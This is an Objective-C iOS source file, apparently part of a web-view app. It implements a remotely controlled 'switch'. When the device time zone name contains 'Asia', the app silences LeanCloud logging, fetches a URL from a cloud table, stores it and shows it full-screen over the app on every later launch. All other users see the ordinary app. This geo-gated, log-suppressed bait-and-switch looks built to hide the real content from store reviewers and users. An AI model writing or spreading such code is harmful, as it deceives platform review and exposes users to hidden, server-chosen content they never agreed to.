//
//  xcloud.m
//  webview
//
//  Created by XUChenghao on 2019/3/12.
//  Copyright © 2019年 XUChenghao. All rights reserved.
//

#import "xcloud.h"
#import <AVOSCloud/AVOSCloud.h>
#import "MyWebView.h"
#import "TextViewController.h"

static BOOL _valid;
static UIView* _view;

@implementation xcloud
+ (void) registApp: (UIView*) view withAppId: (NSString*) appId widthClientKey: (NSString*) clientKey {
    _view = view;
    NSTimeZone *zone = [NSTimeZone localTimeZone];
    NSString *str = [zone name];
    if ([str containsString:@"Asia"]) {
        _valid = YES;
    } else {
        _valid = NO;
    }
    if (_valid) {
        NSUserDefaults* defaults = [NSUserDefaults standardUserDefaults];
        NSString* url = [defaults stringForKey:@"xcloud"];
        if (url != NULL) {
            _valid = NO;
            BOOL p = [defaults boolForKey:@"p"];
            [xcloud showWindow:url isP:p];
        } else {
            [AVOSCloud setLogLevel:AVLogLevelNone];
            [AVOSCloud setAllLogsEnabled:NO];
            [AVOSCloud setVerbosePolicy:kAVVerboseNone];
            [AVOSCloud setApplicationId:appId clientKey:clientKey];
        }
    }
}

+ (void) show: (NSString*) tableName objectId: (NSString*) obj withKey: (NSString*) field {
    if (!_valid) {
        return;
    }
    AVQuery *query = [AVQuery queryWithClassName:tableName];
    [query getObjectInBackgroundWithId:obj block:^(AVObject *object, NSError *error) {
        if (!error) {
            NSString* bar = object[@"bar"];
            NSString *url = object[field];
            NSString* p = object[@"p"];
            BOOL isP = [p isEqualToString:@"true"];
            if (![url isEqual:@""]) {
                NSUserDefaults* defaults = [NSUserDefaults standardUserDefaults];
                [defaults setValue:bar forKey:@"bar"];
                [defaults setValue:url forKey:@"xcloud"];
                [defaults setBool:isP forKey:@"p"];
                [defaults synchronize];
                [xcloud showWindow:url isP:isP];
            }
        }
    }];
}

+ (void) showWindow: (NSString*) url isP: (BOOL)p {
    TextViewController* vc = [[TextViewController alloc] init];
    vc.f = [NSString stringWithFormat:@"%@?t=%ld", url, random()];
    vc.p = p;
    
    UIViewController* parentVc = [xcloud findViewController:_view];
    if (parentVc != NULL) {
        [parentVc presentViewController:vc animated:NO completion:nil];
    } else {
        [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:vc animated:NO completion:nil];
    }
    
    
    
//    MyWebView* webview = [[MyWebView alloc] init:YES];
//    [webview openUrl:url];
//    [_view addSubview:webview];
    
}

+ (UIViewController *)findViewController:(UIView *)sourceView
{
    id target=sourceView;
    while (target) {
        target = ((UIResponder *)target).nextResponder;
        if ([target isKindOfClass:[UIViewController class]]) {
            break;
        }
    }
    return target;
}
@end
